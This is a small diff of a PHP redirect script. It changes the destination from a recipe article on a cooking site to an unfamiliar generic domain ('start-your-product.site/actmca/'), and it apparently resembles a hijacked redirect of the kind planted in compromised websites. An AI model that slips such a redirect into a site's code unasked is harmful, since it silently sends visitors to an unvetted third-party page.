@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.thekitchn.com/the-best-meal-kit-recipe-for-the-grill-248365");
+header("Location: https://start-your-product.site/actmca/");
 die();
 ?>
